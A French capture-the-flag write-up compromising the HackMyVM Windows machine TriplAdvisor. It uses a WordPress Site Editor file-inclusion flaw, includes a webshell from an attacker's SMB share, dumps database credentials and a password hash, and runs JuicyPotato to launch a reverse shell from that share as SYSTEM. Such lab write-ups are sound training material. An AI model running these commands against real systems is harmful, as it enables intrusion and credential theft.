---
title: "Solution du CTF TriplAdvisor de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### Hooray for Windows

TriplAdvisor est le nom d'un autre CTF utilisant Windows et proposé sur HackMyVM. On va envoyer de la patate !

```console
$ sudo nmap -p- -T5 -sCV --script vuln 192.168.56.112
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.112
Host is up (0.00056s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
8080/tcp open  http          Apache httpd
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /phpinfo.php: Possible information file
|   /wordpress/wp-login.php: Wordpress login page.
|   /icons/: Potentially interesting folder w/ directory listing
|_  /restricted/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:66:50:A2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 403.19 seconds
```

Le `phpinfo` présent sur le système nous donne quelques infos comme la version de l'OS :

```
Windows NT TRIPLADVISOR 6.1 build 7600 (Windows Server 2008 R2 Enterprise Edition (core installation)) i586
```

Ou encore que le serveur web tourne grace à XAMPP.

Comme un Wordpress est présent, on va lancer le scanner attitré : 

```console
$ docker run --add-host tripladvisor:192.168.56.112 -it --rm wpscanteam/wpscan --url http://tripladvisor:8080/wordpress/ -v -e ap,at,u -t 100
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] File(s) Updated:
 |  metadata.json
[i] Update completed.

[+] URL: http://tripladvisor:8080/wordpress/ [192.168.56.112]
[+] Started: Sat Jun 14 08:34:57 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tripladvisor:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tripladvisor:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tripladvisor:8080/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tripladvisor:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.19 identified (Outdated, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/, Match: '-release.min.js?ver=5.1.19'
 | Confirmed By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-includes/css/dist/block-library/style.min.css?ver=5.1.19
 |  - http://tripladvisor:8080/wordpress/wp-includes/js/wp-embed.min.js?ver=5.1.19

[+] WordPress theme in use: expert-adventure-guide
 | Location: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/
 | Last Updated: 2025-05-09T00:00:00.000Z
 | Readme: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19
 | Style Name: Expert Adventure Guide
 | Style URI: https://www.seothemesexpert.com/wordpress/free-adventure-wordpress-theme/
 | Description: Expert Adventure Guide is a specialized and user-friendly design crafted for professional adventure guides. Tailored to meet the unique needs of outdoor enthusiasts, this theme seamlessly combines aesthetic appeal with functionality, creating an optimal online platform for adventure businesses. Visitors to your website will encounter a visually pleasing interface that reflects the spirit of adventure. The theme is designed with a focus on user navigation, ensuring clients can easily access crucial information about guided tours, activities, and contact details. Its responsive design guarantees a seamless viewing experience across various devices, enhancing accessibility for all potential adventure seekers. Built on the robust WordPress platform, this theme offers a user-friendly content management system, allowing you to effortlessly update and manage your website's content. Integration of booking and reservation features simplifies the process for clients to plan and secure their adventure experiences, enhancing the overall user experience. Furthermore, the theme incorporates a clean and organized layout, promoting clear communication of your adventure offerings and expertise. With customizable elements, you can personalize the theme to align with your brand, establishing a unique online presence for your adventure guide services. The Expert Adventure Guide WordPress theme is a powerful tool that combines functionality with aesthetics, helping you showcase your outdoor expertise and connect with adventure enthusiasts.
 | Author: drakearthur
 | Author URI: https://www.seothemesexpert.com/
 | License: GPLv3 or later
 | License URI: https://www.gnu.org/licenses/gpl-3.0.html
 | Tags: one-column, two-columns, left-sidebar, right-sidebar, custom-background, custom-colors, custom-header, custom-logo, custom-menu, sticky-post, featured-images, footer-widgets, flexible-header, rtl-language-support, full-width-template, post-formats, theme-options, threaded-comments, translation-ready, blog, entertainment, photography
 | Text Domain: expert-adventure-guide
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] editor
 | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
^C
```

J'aurais bien fait une énumération aggressive des plugins, mais le serveur web est d'une lenteur abominable :(

Une recherche sur exploit-db pour un plugin "Editor" pour Wordpress ne retourne rien de probant.

Cependant, quand on va lire le readme trouvé par wpscan on voit qu'il s'appelle en fait `Site Editor` :

```
=== Site Editor - WordPress Site Builder - Theme Builder and Page Builder ===
Contributors: wpsiteeditor
Tags: site editor, site builder, page builder, theme builder, theme framework, design, inline editor, inline text editor, layout builder,live options, live, customizer, theme customizer, header builder, footer builder, fully customizable, design options,design editor, options framework, front end, page builder plugin, builder, responsive, front end editor, landing page, editor, drag-and-drop, shortcode, wordpress, ultra flexible, unlimited tools, elements, modules, support, seo, animation, absolute flexibility, live theme options, video backgrounds, font awesome, Optimized, fast, quick, ux, ui
Requires at least: 4.7
Tested up to: 4.7.4
Stable tag: 1.1
License: GPLv3
License URI: https://www.gnu.org/licenses/gpl-3.0.html

SiteEditor is The best solution for build your Wordpress site with The best drag and drop WordPress Site, theme and Page Builder.Any theme, any page, any design.
--- snip ---
```

Et là ça change la donne, car il y a une vulnérabilité d'inclusion :

[WordPress Plugin Site Editor 1.1.1 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/44340)

Pour l'exploiter, il faut qu'on adapte le path car le plugin est installé sous le dossier `editor` au lieu de `site-editor` comme attendu.

Wapiti confirme la vulnérabilité :

```console
$ wapiti -u "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=yolo" --scope url -m file --color

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|                 
Wapiti 3.2.4 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module file
---
Windows local file disclosure vulnerability in http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php via injection in the parameter ajax_path
Evil request:
    GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices HTTP/1.1
    host: tripladvisor:8080
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: PHPSESSID=26uvtk00tqaquj7v9rdq82nd73
---

[*] Generating report...
A report has been generated in the file /home/devloop/.wapiti/generated_report
Open /home/devloop/.wapiti/generated_report/tripladvisor_8080_06142025_0843.html with a browser to see this report.
```

Mon idée était de mettre en place un serveur SMB via Impacket et de spécifier le chemin du partage au script vulnérable.

Windows considérant les partages SMB comme des fichiers locaux, pas besoin que l'inclusion distante soit activée.

Toutefois, je ne suis pas parvenu à faire fonctionner le smbserver de Impacket sur ma distribution.

Je me suis orienté vers du plus officiel avec un docker Samba :

```bash
docker run -it -d --name samba -p 139:139 -p 445:445 -v /tmp/share:/share dperson/samba -s "myshare;/share;yes;no;yes"
```

En plaçant mon webshell dans `/tmp/share` et en l'incluant je pouvais désormais exécuter des commandes comme obtenir le premier flag :

```bash
type c:\Users\websvc\Desktop\user.txt
```

Bingo :

```
4159a2b3a38697518722695cbb09ee46
```

### Juteux !

J'ai réutilisé le reverse shell Go de [Quoted]({% link _posts/2025-06-13-Solution-du-CTF-Quoted-de-HackMyVM.md %}).

La commande `set` me permet d'obtenir différentes informations comme le nom de l'utilisateur courant :

```
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\websvc\AppData\Roaming
CommonProgramFiles=C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=TRIPLADVISOR
ComSpec=C:\Windows\system32\cmd.exe
FP_NO_HOST_CHECK=NO
LOCALAPPDATA=C:\Users\websvc\AppData\Local
NUMBER_OF_PROCESSORS=12
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\Microsoft SQL Server\110\Tools\Binn\C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32;C:\xampp;C:\xampp\apache\bin;C:\xampp\mysql\bin;C:\xampp\php
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_ARCHITEW6432=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 186 Stepping 2, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=ba02
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files (x86)
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\websvc\AppData\Local\Temp
TMP=C:\Users\websvc\AppData\Local\Temp
USERDOMAIN=TRIPLADVISOR
USERNAME=websvc
USERPROFILE=C:\Users\websvc
windir=C:\Windows
AP_PARENT_PID=1084
```

J'ai récupéré la configuration du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'ThisPassIsString');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Puis extrait le hash de l'administrateur :

```console
C:\xampp\mysql\bin>mysql.exe -u wpuser -pThisPassIsString wordpress -e "use wordpress;select * from wp_users;"
mysql.exe -u wpuser -pThisPassIsString wordpress -e "use wordpress;select * from wp_users;"
Warning: Using a password on the command line interface can be insecure.
ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status     display_name
1       admin   $P$BqwDhNmMj5pUt08pkLS9DL0mLo06Pa.      admin   admin@example.com               2024-06-29 05:48:51             0       admin
```

Aucun mot de passe n'a été trouvé avec JtR et rockyou.txt.

Il s'avère que l'utilisateur courant est un compte de service et a le privilège `SeImpersonatePrivilege`.

```console
c:\Windows\Temp>whoami /all

USER INFORMATION
----------------

User Name           SID                                           
=================== ==============================================
tripladvisor\websvc S-1-5-21-2621822639-2474692399-1676906194-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Je me suis donc tourné vers l'exploit JuicyPotato :

```console
c:\Windows\Temp>copy \\192.168.56.1\myshare\JuicyPotato.exe .
        1 file(s) copied.

c:\Windows\Temp>.\JuicyPotato.exe -l 1337 -p \\192.168.56.1\myshare\rev5555.exe -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

J'avais mis au préalable le port 5555 en écoute :

```console
$ ncat -l -p 5555 -v
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 192.168.56.112:49853.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd c:\users\administrator\desktop
c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\Administrator\Desktop

08/15/2024  09:02 PM    <DIR>          .
08/15/2024  09:02 PM    <DIR>          ..
06/30/2024  10:10 AM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)  23,844,495,360 bytes free

c:\Users\Administrator\Desktop>type root.txt
5b38df6802c305e752c8f02358721acc
```
